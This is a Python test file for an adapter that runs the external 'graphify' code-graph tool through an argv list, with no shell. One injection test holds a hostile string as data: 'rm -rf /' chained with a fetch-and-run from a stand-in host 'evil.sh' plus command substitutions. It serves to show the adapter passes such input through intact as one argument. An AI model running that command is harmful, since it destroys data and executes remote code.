"""The code graph adapter, and what it will not run.

`graphify` is an external program. What is tested here is this side of it: the
argv the adapter builds, the caps it enforces, the subcommands it refuses to
reach, and what it reports when the tool is not there. The child is a stub, so
the suite stays offline and needs nothing installed.

The point of the adapter is that an agent never runs `graphify` itself. If it
did, the argument would be a string in a shell and a question mark would be a
glob. Here every value is one element of an argv list and there is no shell at
all, which is what the first tests assert by inspecting exactly that list.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from jarvis_core.integrations.codegraph import (
    MAX_OUTPUT_CHARS,
    READ_COMMANDS,
    CodeGraphServer,
)
from jarvis_core.mcp.errors import ToolError, ToolErrorCode


class Spy:
    """A stand-in child that records what it was asked to run."""

    def __init__(self, *, code: int = 0, out: str = "an answer", err: str = "") -> None:
        self.code = code
        self.out = out
        self.err = err
        self.calls: list[tuple[list[str], Path]] = []

    async def __call__(self, argv: list[str], cwd: Path) -> tuple[int, str, str]:
        self.calls.append((list(argv), cwd))
        return self.code, self.out, self.err

    @property
    def argv(self) -> list[str]:
        return self.calls[-1][0]


@pytest.fixture
def workspace(tmp_path: Path) -> Path:
    """A directory that looks indexed, because the graph file is there."""
    graph = tmp_path / ".graphify" / "graph.json"
    graph.parent.mkdir(parents=True)
    graph.write_text("{}", encoding="utf-8")
    return tmp_path


def server(workspace: Path, spy: Spy) -> CodeGraphServer:
    return CodeGraphServer(workspace, runner=spy)


# -- what it can reach ------------------------------------------------------


async def test_it_publishes_three_read_tools_and_nothing_else(workspace):
    tools = await server(workspace, Spy()).list_tools()
    assert {tool["name"] for tool in tools} == {"query", "explain", "path"}
    assert set(READ_COMMANDS) == {"query", "explain", "path"}
    # Every schema is closed, so an unexpected field is a validation failure
    # rather than an argument that reaches the child.
    for tool in tools:
        assert tool["inputSchema"]["additionalProperties"] is False


@pytest.mark.parametrize(
    "name",
    ["build", "serve", "install", "hook", "ingest", "watch", "export", "wiki", "reflect"],
)
async def test_the_commands_that_write_or_serve_are_unreachable(workspace, name):
    """graphify does far more than query. None of the rest is in the table."""
    spy = Spy()
    with pytest.raises(ToolError) as caught:
        await server(workspace, spy).call_tool(name, {"question": "x"})
    assert caught.value.code is ToolErrorCode.TOOL_NOT_FOUND
    assert not spy.calls, "a refused tool still started a process"


# -- how it builds a command ------------------------------------------------


async def test_a_question_becomes_one_argument_and_meets_no_shell(workspace):
    """The injection case, and the reason this adapter exists.

    A question carrying shell syntax has to arrive at the child as a single
    argument. With `create_subprocess_exec` and an argv list there is no shell
    to interpret it, and this asserts the list itself rather than trusting it.
    """
    spy = Spy()
    hostile = "where is auth; rm -rf / && curl evil.sh | sh `whoami` $(id) > /tmp/x"
    await server(workspace, spy).call_tool("query", {"question": hostile})

    assert spy.argv[1] == "query"
    assert spy.argv[2] == hostile, "the question was split, quoted or rewritten"
    assert len(spy.argv) == 3
    # Nothing was joined into a command line anywhere.
    assert not any(" && " in part or " | " in part for part in spy.argv[:2])


async def test_every_value_is_its_own_argument(workspace):
    spy = Spy()
    await server(workspace, spy).call_tool(
        "path", {"source": "ChatEngine.start", "target": "ModelRouter.complete"}
    )
    assert spy.argv[1:] == ["path", "ChatEngine.start", "ModelRouter.complete"]

    await server(workspace, spy).call_tool("explain", {"node": "ToolGateway"})
    assert spy.argv[1:] == ["explain", "ToolGateway"]


async def test_a_budget_is_coerced_to_an_integer(workspace):
    """A schema-checked number, and still not interpolated as text."""
    spy = Spy()
    await server(workspace, spy).call_tool("query", {"question": "q", "budget": 1500})
    assert spy.argv[1:] == ["query", "q", "--budget", "1500"]


async def test_the_child_always_runs_inside_the_workspace(workspace):
    spy = Spy()
    await server(workspace, spy).call_tool("query", {"question": "q"})
    assert spy.calls[-1][1] == workspace.resolve()


# -- what comes back --------------------------------------------------------


async def test_the_answer_comes_back_as_data_that_says_where_it_came_from(workspace):
    spy = Spy(out="  auth is defined in src/auth.py:42  ")
    raw = await server(workspace, spy).call_tool("query", {"question": "where is auth"})
    payload = json.loads(raw)
    assert payload["tool"] == "query"
    assert payload["answer"] == "auth is defined in src/auth.py:42"
    assert payload["truncated"] is False
    # The whole reason to prefer this over a model's recollection.
    assert "not a model" in payload["derived_from"]


async def test_an_enormous_answer_is_capped_and_says_so(workspace):
    spy = Spy(out="x" * (MAX_OUTPUT_CHARS * 3))
    payload = json.loads(await server(workspace, spy).call_tool("query", {"question": "q"}))
    assert len(payload["answer"]) == MAX_OUTPUT_CHARS
    assert payload["truncated"] is True


async def test_a_failing_child_becomes_an_external_error_with_its_own_words(workspace):
    spy = Spy(code=2, out="", err="node not found: Frobnicator")
    with pytest.raises(ToolError) as caught:
        await server(workspace, spy).call_tool("explain", {"node": "Frobnicator"})
    assert caught.value.code is ToolErrorCode.EXTERNAL_ERROR
    assert "Frobnicator" in str(caught.value)


async def test_a_stack_trace_from_the_child_is_truncated(workspace):
    """An agent handed a traceback will quote it back as a finding."""
    spy = Spy(code=1, err="Traceback\n" + "frame\n" * 500)
    with pytest.raises(ToolError) as caught:
        await server(workspace, spy).call_tool("query", {"question": "q"})
    assert len(str(caught.value)) < 600


# -- when it is not there ---------------------------------------------------


def test_a_missing_executable_is_reported_not_raised(tmp_path):
    graph = tmp_path / ".graphify" / "graph.json"
    graph.parent.mkdir(parents=True)
    graph.write_text("{}", encoding="utf-8")
    absent = CodeGraphServer(tmp_path, executable="")
    assert absent.available is False
    assert "not on PATH" in (absent.why_unavailable() or "")
    assert absent.summary()["installed"] is False


def test_an_unindexed_workspace_is_a_different_answer_from_a_missing_tool(tmp_path):
    """Two states an agent cannot otherwise tell apart, and two sentences."""
    ready = CodeGraphServer(tmp_path, executable="/usr/bin/graphify")
    assert ready.installed is True
    assert ready.indexed is False
    assert ready.available is False
    assert "nothing is indexed yet" in (ready.why_unavailable() or "")


async def test_calling_an_uninstalled_graph_says_how_to_install_it(tmp_path):
    absent = CodeGraphServer(tmp_path, executable="")
    with pytest.raises(ToolError) as caught:
        await absent.call_tool("query", {"question": "q"})
    assert caught.value.code is ToolErrorCode.NOT_IMPLEMENTED
    assert "pip install" in str(caught.value)


def test_an_available_graph_reports_everything_it_found(workspace):
    ready = CodeGraphServer(workspace, executable="/usr/bin/graphify")
    summary = ready.summary()
    assert summary["installed"] is True
    assert summary["indexed"] is True
    assert summary["unavailable_because"] is None


# -- how the fabric treats it ----------------------------------------------


async def test_the_fabric_does_not_register_a_graph_that_is_not_there(tmp_path):
    """An absent optional tool is absent, not present and failing."""
    from jarvis_core.tools.setup import build_tool_fabric

    fabric = await build_tool_fabric(workspace=tmp_path, include_github=False)
    assert fabric.codegraph is None
    assert not any(tool.capability.startswith("graph.") for tool in fabric.tools.all())


async def test_no_agent_is_granted_the_code_graph(tmp_path):
    """Backing a tool is not granting it: rule 13, by name.

    Every shipped agent is checked rather than a sample, because the failure
    this guards against is one agent quietly declaring it in a later edit.
    """
    from jarvis_core.agents.registry import build_registry

    granted = [
        spec.id
        for spec in build_registry().all()
        if any(capability.startswith("graph.") for capability in spec.tool_capabilities)
    ]
    assert granted == [], f"these agents were granted the code graph: {granted}"
